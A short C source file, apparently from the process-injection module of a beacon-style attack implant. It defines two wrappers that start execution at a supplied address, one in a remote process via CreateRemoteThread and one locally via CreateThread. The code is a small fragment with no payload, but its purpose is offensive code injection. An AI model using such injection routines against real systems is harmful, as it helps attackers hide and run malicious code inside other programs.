#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

BOOL inject_via_remotethread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter) {
	/* kick it off */
	return (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL);
}

BOOL inject_via_createthread(HANDLE hProcess, DWORD pid, LPVOID lpStartAddress, LPVOID lpParameter) {
	return (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)((char *)lpStartAddress), lpParameter, 0, NULL) != NULL);
}